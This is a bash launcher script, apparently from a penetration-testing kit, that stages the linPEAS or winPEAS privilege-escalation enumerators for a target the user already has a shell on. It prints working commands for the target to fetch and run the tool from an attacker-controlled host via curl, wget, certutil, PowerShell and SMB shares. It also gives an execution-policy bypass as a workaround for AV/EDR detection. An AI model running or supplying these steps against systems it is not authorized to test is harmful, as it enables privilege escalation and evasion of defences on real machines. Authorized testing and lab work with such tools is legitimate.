#!/usr/bin/env bash
# privesc-launcher.sh -- stages the right local-privesc enumerator for the target OS, using the
# exact commands already documented in notes/linux-privesc-advanced.md and
# notes/windows-privesc-scripts.md. This script STAGES (downloads/prepares the file and prints the
# transfer options) -- it does not attempt to remote-execute on a shell it doesn't control; you
# already have a shell on target or this script has nothing to hand off to.
#
# Usage: privesc-launcher.sh <linux|windows>
set -uo pipefail

OS="${1:-}"
if [[ "$OS" != "linux" && "$OS" != "windows" ]]; then
    echo "Usage: $0 <linux|windows>" >&2
    exit 1
fi

OUT="./privesc-launcher-out"
if ! mkdir -p "$OUT"; then
    echo "[!] Failed to create output directory: $OUT" >&2
    exit 1
fi

if [[ "$OS" == "linux" ]]; then
    echo "[*] Staging linPEAS (notes/linux-privesc-advanced.md)"
    if command -v curl >/dev/null 2>&1; then
        if curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$OUT/linpeas.sh"; then
            chmod +x "$OUT/linpeas.sh"
            echo "[*] Staged: $OUT/linpeas.sh"
        else
            echo "[!] curl download failed (exit $?) -- check connectivity and retry, or stage manually per notes/linux-privesc-advanced.md" >&2
            exit 1
        fi
    else
        echo "[!] curl not found -- stage manually per notes/linux-privesc-advanced.md" >&2
        exit 1
    fi

    cat <<'EOF'

Transfer options (see notes/file-transfer-matrix.md for the full matrix):
  - python3 -m http.server 8000   (from this directory), then on target:
      curl http://<attacker_ip>:8000/linpeas.sh -o linpeas.sh
      wget http://<attacker_ip>:8000/linpeas.sh
  - impacket-smbserver SHARE . -smb2support, then on target: copy/mount the share

On target, run:
  chmod +x linpeas.sh
  ./linpeas.sh -a | tee linpeas_out.txt      # -a = all checks, deep/slow
  ./linpeas.sh -s                            # -s = superfast/stealth, skips slow checks

Pull linpeas_out.txt back with whichever transfer method you used to stage it.

Once you have a kernel/distro version from the output, cross-reference it against
notes/easy-lpe-cve-quickhits.md for a known-CVE fast path before manual technique-hunting.
EOF

else
    echo "[*] Staging winPEAS (notes/windows-privesc-scripts.md)"
    if command -v curl >/dev/null 2>&1; then
        if curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o "$OUT/winPEASx64.exe"; then
            echo "[*] Staged: $OUT/winPEASx64.exe"
        else
            echo "[!] curl download failed (exit $?) -- check connectivity and retry, or stage manually per notes/windows-privesc-scripts.md" >&2
            exit 1
        fi
    else
        echo "[!] curl not found -- stage manually per notes/windows-privesc-scripts.md" >&2
        exit 1
    fi

    cat <<'EOF'

Transfer options (see notes/file-transfer-matrix.md for the full matrix):
  - On target (native, no extra tooling):
      certutil -urlcache -split -f http://<attacker_ip>:8000/winPEASx64.exe winpeas.exe
  - PowerShell:
      powershell -c "Invoke-WebRequest http://<attacker_ip>:8000/winPEASx64.exe -OutFile winPEASx64.exe"
  - impacket-smbserver SHARE . -smb2support, then on target: copy \\<attacker_ip>\SHARE\winPEASx64.exe .

On target, run:
  .\winPEASx64.exe                        (all checks)
  .\winPEASx64.exe systeminfo userinfo    (specific checks only)

If winPEAS is likely to get flagged by AV/EDR, PrivescCheck.ps1 is the PowerShell-native
alternative (notes/windows-privesc-scripts.md):
  powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"

Once you have a Windows build/version from the output, cross-reference it against
notes/easy-lpe-cve-quickhits.md for a known-CVE fast path before manual technique-hunting.
EOF
fi
